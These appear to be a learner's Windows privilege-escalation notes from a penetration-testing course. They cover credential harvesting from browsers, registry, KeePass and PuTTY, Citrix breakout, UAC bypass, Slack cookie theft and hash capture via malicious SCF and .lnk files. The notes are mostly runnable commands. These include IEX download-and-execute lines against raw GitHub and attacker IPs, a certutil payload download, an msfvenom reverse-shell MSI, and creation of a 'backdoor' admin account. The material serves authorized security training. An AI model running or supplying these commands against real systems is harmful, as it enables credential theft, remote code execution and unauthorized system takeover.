        C:\> cmdkey /list

        We can also attempt to reuse the credentials using runas to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:

        PS C:\> runas /savecred /user:inlanefreight\bob "COMMAND HERE"



                -Browser Credentials


        -Retrieving Saved Credentials from Chrome

        Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as SharpChrome to retrieve cookies and saved logins from Google Chrome.

        PS C:\> .\SharpChrome.exe logins /unprotect


        -Password Managers
         If we find a .kdbx file on a server, workstation, or file share, we know we are dealing with a KeePass database which is often protected by just a master password. If we can download a .kdbx file to our attacking host, we can use a tool such as keepass2john to extract the password hash and run it through a password cracking tool such as Hashcat or John the Ripper.

        
        -Extracting KeePass Hash

        $ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 

        -Cracking Hash Offline

        hash mode 13400 for KeePass

        $ hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt


        -Email

        If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool MailSniper.


        -More Fun with Credentials

        When all else fails, we can run the LaZagne tool in an attempt to retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.). The tool can be used to run all modules, specific modules (such as databases), or against a particular piece of software (i.e., OpenVPN). The output can be saved to a standard text file or in JSON format.


        -Running All LaZagne Modules

        PS C:\> .\lazagne.exe all


        -Even More Fun with Credentials

        We can use SessionGopher to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It searches the HKEY_USERS hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. 

        -Running SessionGopher as Current User

        We need local admin access to retrieve stored session information for every user in HKEY_USERS, but it is always worth running as our current user to see if we can find any useful credentials.


        PS C:\> Import-Module .\SessionGopher.ps1
 
        PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01


        -Clear-Text Password Storage in the Registry


        -Windows AutoLogon

        Windows Autologon is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup. However, once this is configured, the username and password are stored in the registry, in clear-text. 

        The registry keys associated with Autologon can be found under HKEY_LOCAL_MACHINE in the following hive, and can be accessed by standard users:

        HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

        The typical configuration of an Autologon account involves the manual setting of the following registry keys:

        AdminAutoLogon - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
        DefaultUserName - Holds the value of the username of the account that will automatically log on.
        DefaultPassword - Holds the value of the password for the user account specified previously.


        -Enumerating Autologon with reg.exe

        C:\>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"



        -Putty

        Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>

        PS C:\> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

        PS C:\> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh



        -Wifi Passwords

        -Viewing Saved Wireless Networks

        If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.

        C:\> netsh wlan show profile

        -Retrieving Saved Wireless Passwords

        C:\> netsh wlan show profile ilfreight_corp key=clear





                        ///Citrix Breakout


        

        Numerous organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM and Kiosk to offer remote access solutions in order to meet their business requirements. However, in most organizations "lock-down" measures are implemented in their desktop environments to minimize the potential impact of malicious staff members and compromised accounts on overall domain security. While these desktop restrictions can impede threat actors, there remains a possibility for them to "break-out" of the restricted environment.


        Basic Methodology for break-out:

                Gain access to a Dialog Box.
                Exploit the Dialog Box to achieve command execution.
                Escalate privileges to gain higher levels of access.

        
        There are many techniques which can be used for breaking out of a Citrix environment. This section will not cover every possible scenario, but we will walk through the most common ways to perform a Citrix breakout.




                -Bypassing Path Restrictions


        
        When we attempt to visit C:\Users using File Explorer, we find it is restricted and results in an error. This indicates that group policy has been implemented to restrict users from browsing directories in the C:\ drive using File Explorer. In such scenarios, it is possible to utilize windows dialog boxes as a means to bypass the restrictions imposed by group policy. Once a Windows dialog box is obtained, the next step often involves navigating to a folder path containing native executables that offer interactive console access (i.e.: cmd.exe). Usually, we have the option to directly enter the folder path into the file name field to gain access to the file.


        Numerous desktop applications deployed via Citrix are equipped with functionalities that enable them to interact with files on the operating system. Features like Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print, usually provide an attacker with an opportunity to invoke a Windows dialog box. There are multiple ways to open dialog box in windows using tools such as Paint, Notepad, Wordpad, etc. We will cover using MS Paint as an example for this section.

        Run Paint from start menu and click on File > Open to open the Dialog Box.

        With the windows dialog box open for paint, we can enter the UNC path \\127.0.0.1\c$\users\pmorgan under the File name field, with File-Type set to All Files and upon hitting enter we gain access to the desired directory.




                --Accessing SMB share from restricted environment

        
        Having restrictions set, File Explorer does not allow direct access to SMB shares on attacker machine. However, by utilizing the UNC path within the Windows dialog box, it's possible to circumvent this limitation. This approach can be employed to facilitate file transfers from a different computer.


        Start a SMB server from the attacker machine using Impacket's smbserver.py script.
        root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)


        Back in the Citrix environment, initiate the "Paint" application via the start menu. Proceed to navigate to the "File" menu and select "Open", thereby prompting the Dialog Box to appear. Within this Windows dialog box associated with Paint, input the UNC path as \\10.13.38.95\share into the designated "File name" field. Ensure that the File-Type parameter is configured to "All Files." Upon pressing the "Enter" key, entry into the share is achieved.


        Due to the presence of restrictions within the File Explorer, direct file copying is not viable. Nevertheless, an alternative approach involves right-clicking on the executables and subsequently launching them. Right-click on the pwn.exe binary and select Open, which should prompt us to run it and a cmd console will be opened.



                --Alternate Explorer
        

        In cases where strict restrictions are imposed on File Explorer, alternative File System Editors like Q-Dir or Explorer++ can be employed as a workaround. These tools can bypass the folder restrictions enforced by group policy, allowing users to navigate and access files and directories that would otherwise be restricted within the standard File Explorer environment.

        It's worth noting the previous inability of File Explorer to copy files from the SMB share due to restrictions in place. However, through the utilization of Explorer++, the capability to copy files from the \\10.13.38.95\share location to the Desktop belonging to the user pmorgan has been successfully demonstrated in following screenshot.


                --Alternate Registry Editors
        
        Similarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. Simpleregedit, Uberregedit and SmallRegistryEditor are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy. These tools offer a practical and effective solution for managing registry settings in such restricted environments.


                --Modify existing shortcut file

        
        Unauthorized access to folder paths can also be achieved by modifying existing Windows shortcuts and setting a desired executable's path in the Target field.

        The following steps outline the process:

                Right-click the desired shortcut.

                Select Properties. 

                Within the Target field, modify the path to the intended folder for access. 

                Execute the Shortcut and cmd will be spawned 




                --Script Execution

        
        When script extensions such as .bat, .vbs, or .ps are configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place. This situation creates a potential security vulnerability where malicious actors could exploit these features to execute unauthorized actions on the system.

               1 Create a new text file and name it "evil.bat".
               
               2 Open "evil.bat" with a text editor such as Notepad.
               
               3 Input the command "cmd" into the file. 

               4 Save the file. 


        Upon executing the "evil.bat" file, it will initiate a Command Prompt window. This can be useful for performing various command-line operations.



                --Escalating Privileges
        
        Once access to the command prompt is established, it's possible to search for vulnerabilities in a system more easily. For instance, tools like Winpeas and PowerUp can also be employed to identify potential security issues and vulnerabilities within the operating system.


        Example

        Using PowerUp.ps1, we find that Always Install Elevated key is present and set.

        We can also validate this using the Command Prompt by querying the corresponding registry keys:

        C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

        HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1

        C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

        HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1

        Once more, we can make use of PowerUp, using it's Write-UserAddMSI function. This function facilitates the creation of an .msi file directly on the desktop.

        PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
        PS C:\Users\pmorgan\Desktop> Write-UserAddMSI

        Now we can execute UserAdd.msi and create a new user backdoor:T3st@123 under Administrators group. Note that giving it a password that doesn’t meet the password complexity criteria will throw an error.

        Back in CMD execute runas to start command prompt as the newly created backdoor user.




                --Bypassing UAC

        
        Even though the newly established user backdoor is a member of Administrators group, accessing the C:\users\Administrator directory remains unfeasible due to the presence of User Account Control (UAC). UAC is a security mechanism implemented in Windows to protect the operating system from unauthorized changes. With UAC, each application that requires the administrator access token must prompt the end user for consent.

        Numerous UAC bypass scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.

        (  https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC  )

        PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
        PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep

        Following a successful UAC bypass, a new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command whoami /all or whoami /priv. This command provides a comprehensive view of the current user's privileges. And we can now access the Administrator directory.





                        //Interacting with Users


                --Traffic Capture

        If Wireshark is installed, unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default.

        While not highly likely, if Wireshark is installed on a box that we land on, it is worth attempting a traffic capture to see what we can pick up.

        Also, suppose our client positions us on an attack machine within the environment. In that case, it is worth running tcpdump or Wireshark for a while to see what types of traffic are being passed over the wire and if we can see anything interesting. The tool net-creds can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file. It is worth letting this tool run in the background during an assessment or running it against a pcap to see if we can extract any credentials useful for privilege escalation or lateral movement.

        ( https://github.com/DanMcInerney/net-creds )



                --Process Command Lines
        
        -Monitoring for Process Command Lines

        When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.

        while($true)
        {

        $process = Get-WmiObject Win32_Process | Select-Object CommandLine
        Start-Sleep 1
        $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
        Compare-Object -ReferenceObject $process -DifferenceObject $process2

        }

        
        -Running Monitor Script on Target Host

        We can host the script on our attack machine and execute it on the target host as follows.

        PS C:\> IEX (iwr 'http://10.10.10.205/procmon.ps1') 


                
                
                --Vulnerable Services


        We may also encounter situations where we land on a host running a vulnerable application that can be used to elevate privileges through user interaction. CVE-2019–15752 is a great example of this. This was a vulnerability in Docker Desktop Community Edition before 2.1.0.1. When this particular version of Docker starts, it looks for several different files, including docker-credential-wincred.exe, docker-credential-wincred.bat, etc., not exist with a Docker installation. The program looks for these files in the C:\PROGRAMDATA\DockerDesktop\version-bin\. This directory was misconfigured to allow full write access to the BUILTIN\Users group, meaning that any authenticated user on the system could write a file into it (such as a malicious executable).

        Any executable placed in that directory would run when a) the Docker application starts and b) when a user authenticates using the command docker login. While a bit older, it is not outside the realm of possibility to encounter a developer's workstation running this version of Docker Desktop, hence why it is always important to thoroughly enumerate installed software. 


        --SCF on a File Share

        A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as Responder, Inveigh, or InveighZero, we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation. We may be able to capture a user's password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.

        -Malicious SCF File

        In this example, let's create the following file and name it something like @Inventory.scf (similar to another file in the directory, so it does not appear out of place). We put an @ at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our tun0 IP address and any fake share name and .ico file name.

        [Shell]
        Command=2
        IconFile=\\10.10.14.3\share\legit.ico
        [Taskbar]
        Command=ToggleDesktop

        -Starting Responder

        $ sudo responder -wrf -v -I tun0

        -Cracking NTLMv2 Hash with Hashcat

        $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt


        -Capturing Hashes with a Malicious .lnk File

        This attack no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file. We can use various tools to generate a malicious .lnk file, such as Lnkbomb, as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:

        ( https://github.com/dievus/lnkbomb  )


        
        -Generating a Malicious .lnk File

        
        $objShell = New-Object -ComObject WScript.Shell
        $lnk = $objShell.CreateShortcut("C:\legit.lnk")
        $lnk.TargetPath = "\\<attackerIP>\@pwn.png"
        $lnk.WindowStyle = 1
        $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
        $lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
        $lnk.HotKey = "Ctrl+Alt+O"
        $lnk.Save()
                        

        


                        ///Pillaging


        Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.


        -Data Sources


        Installed applications
        Installed services
                Websites
                File Shares
                Databases
                Directory Services (such as Active Directory, Azure AD, etc.)
                Name Servers
                Deployment Services
                Certificate Authority
                Source Code Management Server
                Virtualization
                Messaging
                Monitoring and Logging Systems
                Backups
        Sensitive Data
                Keylogging
                Screen Capture
                Network Traffic Capture
                Previous Audit reports
        User Information
                History files, interesting documents (.doc/x,.xls/x,password./pass., etc)
                Roles and Privileges
                Web Browsers
                IM Clients

        
        -Scenario

        -Installed Applications

        We can use dir or ls to check the content of Program Files and Program Files (x86) to find which applications are installed. Although there may be other apps on the computer, this is a quick way to review them.

        C:\>dir "C:\Program Files"


        -Get Installed Programs via PowerShell & Registry Keys

        PS C:\> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
        
        PS C:\> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
       
        PS C:\> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize


        
        -mRemoteNG


        mRemoteNG saves connection info and credentials to a file called confCons.xml.

        By default, the configuration file is located in %USERPROFILE%\APPDATA\Roaming\mRemoteNG.

        -mRemoteNG Configuration File - confCons.xml

        <?XML version="1.0" encoding="utf-8"?>
        
        <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
                 <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
        ..SNIP..
        
        </Connections>

        
        This XML document contains a root element called Connections with the information about the encryption used for the credentials and the attribute Protected, which corresponds to the master password used to encrypt the document. We can use this string to attempt to crack the master password. We will find some elements named Node within the root element. Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password. All fields are plaintext except the password, which is encrypted with the master password.

        -Decrypt the Password with mremoteng_decrypt

        $ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 

        (https://github.com/haseebT/mRemoteNG-Decrypt)

        We need to copy the attribute Password content and use it with the option -s. If there's a master password and we know it, we can then use the option -p with the custom master password to also decrypt the password.


        In case we want to attempt to crack the password, we can modify the script to try multiple passwords from a file, or we can create a Bash for loop. We can attempt to crack the Protected attribute or the Password itself. If we try to crack the Protected attribute once we find the correct password, the result will be Password: ThisIsProtected. If we try to crack the Password directly, the result will be Password: <PASSWORD>.

        $ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    



        -Abusing Cookies to Get Access to IM Clients

        With the ability to instantaneously send messages between co-workers and teams, instant messaging (IM) applications like Slack and Microsoft Teams have become staples of modern office communications. These applications help in improving collaboration between co-workers and teams. If we compromise a user account and gain access to an IM Client, we can look for information in private chats and groups.

        There are multiple options to gain access to an IM Client; one standard method is to use the user's credentials to get into the cloud version of the instant messaging application as the regular user would.

        If the user is using any form of multi-factor authentication, or we can't get the user's plaintext credentials, we can try to steal the user's cookies to log in to the cloud-based client.




        Let's use Slack as an example. Multiple posts refer to how to abuse Slack such as Abusing Slack for Offensive Operations and Phishing for Slack-tokens. 

        (  https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282  )

        (  https://thomfre.dev/post/2021/phishing-for-slack-tokens/   )


        There's also a tool called SlackExtract released in 2018, which was able to extract Slack messages. Their research discusses the cookie named d, which Slack uses to store the user's authentication token. If we can get our hands on that cookie, we will be able to authenticate as the user. Instead of using the tool, we will attempt to obtain the cookie from Firefox or a Chromium-based browser and authenticate as the user.

        (   https://github.com/clr2of8/SlackExtract  )


      
        -Cookie Extraction from Firefox

        Firefox saves the cookies in an SQLite database in a file named cookies.sqlite. This file is in each user's APPDATA directory %APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.

        PS C:\> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .

        We can copy the file to our machine and use the Python script cookieextractor.py to extract cookies from the Firefox cookies.SQLite database.

        (  https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py  )

        $ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

        Now that we have the cookie, we can use any browser extension to add the cookie to our browser. For this example, we will use Firefox and the extension Cookie-Editor.

        Our target website is slack.com. Now that we have the cookie, we want to impersonate the user. Let's navigate to slack.com once the page loads, click on the icon for the Cookie-Editor extension, and modify the value of the d cookie with the value you have from the cookieextractor.py script. Make sure to click the save icon (marked in red in the image below).

        Once you have saved the cookie, you can refresh the page and see that you are logged in as the user.

        Now we are logged in as the user and can click on Launch Slack. We may get a prompt for credentials or other types of authentication information; we can repeat the above process and replace the cookie d with the same value we used to gain access the first time on any website that asks us for information or credentials.

        Once we complete this process for every website where we get a prompt, we need to refresh the browser, click on Launch Slack and use Slack in the browser.

        After gaining access, we can use built-in functions to search for common words like passwords, credentials, PII, or any other information relevant to our assessment.



        -Cookie Extraction from Chromium-based Browsers

        The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with Data Protection API (DPAPI). DPAPI is commonly used to encrypt data using information from the current user account or computer.

        To get the cookie value, we'll need to perform a decryption routine from the session of the user we compromised. Thankfully, a tool SharpChromium does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.

        (  https://github.com/djhohnstein/SharpChromium  )




        -PowerShell Script - Invoke-SharpChromium

        PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')

        PS C:\> Invoke-SharpChromium -Command "cookies slack.com"


        We got an error because the cookie file path that contains the database is hardcoded in SharpChromium, and the current version of Chrome uses a different location.

        We can modify the code of SharpChromium or copy the cookie file to where SharpChromium is looking.

        SharpChromium is looking for a file in %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies, but the actual file is located in %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies with the following command we will copy the file to the location SharpChromium is expecting.

        PS C:\> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"


        PS C:\> Invoke-SharpChromium -Command "cookies slack.com"





                --Clipboard

        
        We can use the Invoke-Clipboard script to extract user clipboard data. Start the logger by issuing the command below.

        (  https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1  )

        PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')

        PS C:\> Invoke-ClipboardLogger





                --Roles and Services
        
        -Attacking Backup Servers

        Typically backup systems need an account to connect to the target machine and perform the backup. Most companies require that backup accounts have local administrative privileges on the target machine to access all its files and services.

        If we gain access to a backup system, we may be able to review backups, search for interesting hosts and restore the data we want.

        As we previously discussed, we are looking for information that can help us move laterally in the network or escalate our privileges. Let's use restic as an example. Restic is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.

        To start working with restic, we must create a repository (the directory where backups will be stored). Restic checks if the environment variable RESTIC_PASSWORD is set and uses its content as the password for the repository. If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository.

        We will use restic 0.13.1 and back up the repository C:\xampp\htdocs\webapp in E:\restic\ directory. To download the latest version of restic, visit https://github.com/restic/restic/releases/latest. On our target machine, restic is located at C:\Windows\System32\restic.exe.

        We first need to create and initialize the location where our backup will be saved, called the repository.

        -restic - Initialize Backup Directory

        PS C:\> mkdir E:\restic2; restic.exe -r E:\restic2 init

        -restic - Back up a Directory

        PS C:\> $env:RESTIC_PASSWORD = 'Password'
        PS C:\> restic.exe -r E:\restic2\ backup C:\SampleFolder


        !!!If we want to back up a directory such as C:\Windows, which has some files actively used by the operating system, we can use the option --use-fs-snapshot to create a VSS (Volume Shadow Copy) to perform the backup.


        -restic - Back up a Directory with VSS

        PS C:\> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

        
        Note: If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.

        We can also check which backups are saved in the repository using the shapshot command.

        
        -restic - Check Backups Saved in a Repository

        PS C:\> restic.exe -r E:\restic2\ snapshots



        -restic - Restore a Backup with ID

        We can restore a backup using the ID the snapshot command showed

        PS C:\> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

        If we navigate to C:\Restore, we will find the directory structure where the backup was taken. To get to the SampleFolder directory, we need to navigate to C:\Restore\C\SampleFolder.

        If we are targeting a Windows backup, we may want to look for the SAM & SYSTEM hive to extract local account hashes. We can also identify web application directories and common files where credentials or sensitive information is stored, such as web.config files. Our goal is to look for any interesting files that can help us archive our goal.

        



                        //Miscellanious Techniques




                --Living Off The Land Binaries and Scripts (LOLBAS)
        
        The LOLBAS project documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft and have unexpected functionality useful to an attacker. 

        
        -Transferring File with Certutil


        One classic example is certutil.exe, whose intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.

        PS C:\> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

        
        -Encoding File with Certutil

        We can use the -encode flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system.

        C:\> certutil -encode file1 encodedfile


        -Decoding File with Certutil

        C:\> certutil -decode encodedfile file2


        A binary such as rundll32.exe can be used to execute a DLL file. We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.



        -Always Install Elevated

        This setting can be set via Local Group Policy by setting Always install with elevated privileges to Enabled under the following paths.

                Computer Configuration\Administrative Templates\Windows Components\Windows Installer

                User Configuration\Administrative Templates\Windows Components\Windows Installer



        -Enumerating Always Install Elevated Settings

        PS C:\> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

        PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer


        -Generating MSI Package

        We can exploit this by generating a malicious MSI package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.

        $ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

        -Executing MSI Package

        C:\> msiexec /i c:\users\-student\desktop\aie.msi /quiet /qn /norestart




        -CVE-2019-1388

        CVE-2019-1388 was a privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges. The issue was in the UAC mechanism, which presented an option to show information about an executable's certificate, opening the Windows certificate dialog when a user clicks the link. The Issued By field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) 1.3.6.1.4.1.311.2.1.10. This OID value is identified in the wintrust.h header as SPC_SP_AGENCY_INFO_OBJID which is the SpcSpAgencyInfo field in the details tab of the certificate dialog. If it is present, a hyperlink included in the field will render in the General tab. This vulnerability can be exploited easily using an old Microsoft-signed executable (hhupd.exe) that contains a certificate with the SpcSpAgencyInfo field populated with a hyperlink.

        When we click on the hyperlink, a browser window will launch running as NT AUTHORITY\SYSTEM. Once the browser is opened, it is possible to "break out" of it by leveraging the View page source menu option to launch a cmd.exe or PowerShell.exe console as SYSTEM.

        First right click on the hhupd.exe executable and select Run as administrator from the menu.

        Next, click on Show information about the publisher's certificate to open the certificate dialog. Here we can see that the SpcSpAgencyInfo field is populated in the Details tab.

        Next, we go back to the General tab and see that the Issued by field is populated with a hyperlink. Click on it and then click OK, and the certificate dialog will close, and a browser window will launch.

        If we open Task Manager, we will see that the browser instance was launched as SYSTEM.

        Next, we can right-click anywhere on the web page and choose View page source. Once the page source opens in another tab, right-click again and select Save as, and a Save As dialog box will open.

        At this point, we can launch any program we would like as SYSTEM. Type c:\windows\system32\cmd.exe in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.




                --Scheduled Tasks

        
        -Enumerating Scheduled Tasks

        C:\>  schtasks /query /fo LIST /v

        -Enumerating Scheduled Tasks with PowerShell

        (  https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps )

        PS C:\> Get-ScheduledTask | select TaskName,State

        By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in C:\Windows\System32\Tasks, which standard users do not have read access to. It is not uncommon for system administrators to go against security practices and perform actions such as provide read or write access to a folder usually reserved only for administrators. We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task.

        -Checking Permissions on C:\Scripts Directory

        C:\> .\accesschk64.exe /accepteula -s -d C:\Scripts\


        
                -User/Computer Description Field


        -Checking Local User Description Field

        Though more common in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user's account description field. We can enumerate this quickly for local users using the Get-LocalUser cmdlet.

        PS C:\> Get-LocalUser


        -Enumerating Computer Description Field with Get-WmiObject Cmdlet

        We can also enumerate the computer description field via PowerShell using the Get-WmiObject cmdlet with the Win32_OperatingSystem class.

        PS C:\> Get-WmiObject -Class Win32_OperatingSystem | select Description




                ---Mount VHDX/VMDK

        
        
        Three specific file types of interest are .vhd, .vhdx, and .vmdk files. These are Virtual Hard Disk, Virtual Hard Disk v2 (both used by Hyper-V), and Virtual Machine Disk (used by VMware). 

        If we encounter any of these three files, we have options to mount them on either our local Linux or Windows attack boxes. If we can mount a share from our Linux attack box or copy over one of these files, we can mount them and explore the various operating system files and folders as if we were logged into them using the following commands.

        -Mount VMDK on Linux

        $ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

        -Mount VHD/VHDX on Linux

        $ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1


        -Windows mount

        - VHD and VHDX
        In Windows, we can right-click on the file and choose Mount, or use the Disk Management utility to mount a .vhd or .vhdx file. If preferred, we can use the Mount-VHD PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.

        -VMDK

        For a .vmdk file, we can right-click and choose Map Virtual Disk from the menu. Next, we will be prompted to select a drive letter. If all goes to plan, we can browse the target operating system's files and directories. If this fails, we can use VMWare Workstation File --> Map Virtual Disks to map the disk onto our base system. We could also add the .vmdk file onto our attack VM as an additional virtual hard drive, then access it as a lettered drive. We can even use 7-Zip to extract data from a .vmdk file. This guide illustrates many methods for gaining access to the files on a .vmdk file.


        -Retrieving Hashes using Secretsdump.py

         If we can locate a backup of a live machine, we can access the C:\Windows\System32\Config directory and pull down the SAM, SECURITY and SYSTEM registry hives. We can then use a tool such as secretsdump to extract the password hashes for local users.

         $ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL





                        //Dealing with End of Life Systems


        

                --Windows Server

        
        -Attacking Server 2008
        


